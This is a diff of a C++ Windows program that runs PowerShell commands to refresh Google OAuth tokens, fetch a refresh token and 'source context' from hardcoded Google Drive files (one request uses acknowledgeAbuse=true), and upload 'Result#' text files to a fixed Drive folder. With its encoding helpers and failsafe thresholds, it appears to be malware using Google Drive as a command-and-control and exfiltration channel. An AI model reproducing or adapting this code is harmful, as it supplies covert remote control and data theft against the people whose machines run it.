@@ -9,6 +9,10 @@
 #define PROGRAM_CYCLE_THRESHOLD 4100 * 1000 
 #define FAILSAFE_THRESHOLD 2402 * 1000
 #define EXPONENTIAL_POWER 4
+#define RESULTS_FOLDER_ID "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB"
+#define SOURCE_DRIVE_ID "1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er"
+#define UPLOAD_BUFFER_SIZE 7680
+
 static const char bs64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 "abcdefghijklmnopqrstuvwxyz"
 "0123456789+/";
@@ -128,18 +132,17 @@ static MyString encoder(MyString W, int shift) {
 static WORD setNewAccessToken(std::string& accessToken, std::string refreshToken) {
 
 	char* buffer = new char[1024];
-	sprintf_s(buffer, 1024, "powershell.exe -Command \"try{$headers = New-Object 'System.Collections.Generic.Dictionary[[String],[String]]'; $headers.Add('Host', 'oauth2.googleapis.com'); $headers.Add('Content-Type', 'application/x-www-form-urlencoded'); $body = 'client_id=%s&client_secret=%s&grant_type=refresh_token&refresh_token=%s'; $response = Invoke-RestMethod 'https://oauth2.googleapis.com/token' -Method 'POST' -Headers $headers -Body $body -TimeoutSec 30;Write-Host -NoNewline $response.access_token | ConvertTo-Json}catch{echo 4}\"", g_client_id.c_str(), g_client_secret.c_str(), refreshToken.c_str());
-
+	sprintf_s(buffer, 1024, "powershell.exe -Command \"try{$headers = New-Object 'System.Collections.Generic.Dictionary[[String],[String]]'; $headers.Add('Host', 'oauth2.googleapis.com'); $headers.Add('Content-Type', 'application/x-www-form-urlencoded'); $body = 'client_id=%s&client_secret=%s&grant_type=refresh_token&refresh_token=%s'; $response = Invoke-RestMethod 'https://oauth2.googleapis.com/token' -Method 'POST' -Headers $headers -Body $body -TimeoutSec 30;Write-Host -NoNewline $response.access_token | ConvertTo-Json}catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", g_client_id.c_str(), g_client_secret.c_str(), refreshToken.c_str());
+	///// you should edit here!
 	FILE* file = _popen(buffer, "r");
 	fgets(buffer, 1023, file);
+	_pclose(file);
 
 	if (buffer[0] == '4')
 	{
 		delete[] buffer;
 		return 400;
 	}
-	_pclose(file);
-	g_flag = false;
 	accessToken = buffer;
 
 	delete[] buffer;
@@ -165,6 +168,7 @@ static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& 
 	FILE* file = _popen("powershell -c \"try{Write-Host -NoNewline (Invoke-Restmethod 'https://drive.google.com/uc?export=download&id=1PE_bOI--Ti8exPg6hkq_yIhYBipOVZT1' -TimeoutSec 30).RefreshToken}catch{Write-Host -NoNewline 400}\"", "r");
 
 	fgets(buffer, 1023, file);
+	_pclose(file);
 
 	if (buffer[0] == 'I' && buffer[10] == '!') {
 
@@ -245,10 +249,10 @@ static void handleFailsafe(std::string& refreshToken, std::string& accessToken) 
 /// 600 Timeout!
 /// 601 Unhandled Exception!
 /// </returns>
-static WORD downloadContext(std::string accessToken, std::string& output) {
+static WORD downloadSourceContext(std::string accessToken, std::string& output) {
 	char* buffer = new char[1024];
 
-	snprintf(buffer, 1024, "powershell.exe -c \"try { $response = Invoke-RestMethod 'https://www.googleapis.com/drive/v3/files/1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er?alt=media&acknowledgeAbuse=true&mimeType=text/plain' -TimeoutSec 30 -Method 'GET' -Headers @{'Authorization' = 'Bearer %s'}; Write-Host -NoNewline $response } catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"",
+	snprintf(buffer, 1024, "powershell.exe -c \"try { $response = Invoke-RestMethod 'https://www.googleapis.com/drive/v3/files/%s?alt=media&acknowledgeAbuse=true&mimeType=text/plain' -TimeoutSec 30 -Method 'GET' -Headers @{'Authorization' = 'Bearer %s'}; Write-Host -NoNewline $response } catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", SOURCE_DRIVE_ID,
 		accessToken.c_str()
 	);
 
@@ -257,8 +261,10 @@ static WORD downloadContext(std::string accessToken, std::string& output) {
 	while (fgets(buffer, 1024, file) != NULL) {
 		output = output + buffer;
 	}
+
 	_pclose(file);
 	delete[] buffer;
+
 	if (output.length() == 0)
 	{
 		return 204;
@@ -274,6 +280,36 @@ static WORD downloadContext(std::string accessToken, std::string& output) {
 		}
 	}
 	return 200;
+}
+
+/// <summary>
+/// This function upload a single file up to 6656 characters (Around 6.5 KB).
+/// </summary>
+/// <param name="uploadpart"></param>
+/// <param name="accessToken"></param>
+/// <param name="index"></param>
+/// <param name="subIndex"></param>
+/// 200 OK!
+/// 401 Unauthorized!
+/// 600 Timeout!
+/// 601 Unhandled Exception!
+/// </returns>
+static WORD singlePartUpload(std::string uploadpart, std::string accessToken, DWORD index, DWORD subIndex) {
+	char* buffer = new char[UPLOAD_BUFFER_SIZE + 1];
+	WORD errorCode = 200;
+	snprintf(buffer, UPLOAD_BUFFER_SIZE, "powershell.exe -c \"try {Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/?uploadType=multipart&access_token=%s' -Method 'POST' -TimeoutSec 30 -Headers @{'Content-Type' = 'multipart/related; boundary=boundary'} -Body \\\"`n--boundary`nContent-Type: application/json; charset=UTF-8`n`n{`\\\"name`\\\": `\\\"Result#%d_%d.txt`\\\",`\\\"mimeType`\\\": `\\\"text/plain`\\\",`\\\"parents`\\\": [`\\\"%s`\\\"]}`n`n--boundary`nContent-Type: text/plain`n`n%s`n--boundary--\\\"}catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", accessToken.c_str(), index, subIndex, RESULTS_FOLDER_ID, uploadpart.c_str());
+	FILE* file = _popen(buffer, "r");
+	delete[] buffer;
+	buffer = new char[4];
+	fgets(buffer, 4, file);
+	_pclose(file);
+
+	if (buffer[0] == '4' || buffer[0] == '6')
+	{
+		errorCode = (buffer[0] - '0') * 100 + (buffer[1] - '0') * 10 + (buffer[2] - '0');
+	}
+	delete[] buffer;
+	return errorCode;
 }
 
 //static void upload(MyString data) {
